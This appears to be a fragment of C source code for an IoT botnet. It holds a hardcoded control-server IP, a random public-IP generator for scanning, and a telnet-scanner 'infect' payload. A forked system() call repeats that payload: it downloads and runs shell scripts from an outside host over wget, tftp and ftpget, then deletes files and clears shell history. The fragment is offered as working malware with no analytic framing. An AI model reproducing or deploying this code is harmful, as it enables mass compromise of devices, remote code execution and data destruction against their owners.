...
unsigned char *PromServer[] = {"185.244.25.189:23"};
//Payload For Telnet Scanner
char *infect = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.189/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 185.244.25.189 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 185.244.25.189; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c\r\n";
int initConnection();
...
in_addr_t GetRandomPublicIP()
{
        ...
        while(
                ...
                (ipState[0] == 0) || 									   	   // 185.244.25.189/8        - Invalid address space
...
int pid;
if ( (pid = fork()) == 0) {
system("cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://185.244.25.189/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 185.244.25.189 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 185.244.25.189; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.244.25.189 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c");
